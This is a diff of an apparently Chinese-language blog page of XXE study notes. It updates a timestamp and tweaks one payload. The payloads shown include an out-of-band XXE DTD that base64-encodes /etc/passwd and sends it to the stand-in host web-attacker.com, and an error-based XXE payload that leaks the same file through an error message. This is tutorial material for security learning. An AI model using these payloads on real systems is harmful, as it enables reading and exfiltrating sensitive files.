@@ -25,7 +25,7 @@
 <meta property="og:image" content="http://blog.le31ei.top/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20181120002647-e93bbf00-ec17-1.png">
 <meta property="og:image" content="http://blog.le31ei.top/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210309123241787.png">
 <meta property="article:published_time" content="2021-03-09T04:22:06.000Z">
-<meta property="article:modified_time" content="2021-03-09T04:33:52.818Z">
+<meta property="article:modified_time" content="2021-03-10T05:55:23.797Z">
 <meta property="article:author" content="le31ei">
 <meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary">
@@ -278,7 +278,7 @@ ga('send', 'pageview');
 
 <p>对于很多文件中存在换行符的情况，以上则无法进行处理。</p>
 <p>针对php可以采用伪协议进行base64编码发送</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate; </span><br></pre></td></tr></table></figure>
 
 <p><strong>如果碰到数据带不出来，但有报错的情况，可以使用如下payload，读取不存在的文件，通过报错来回显数据</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
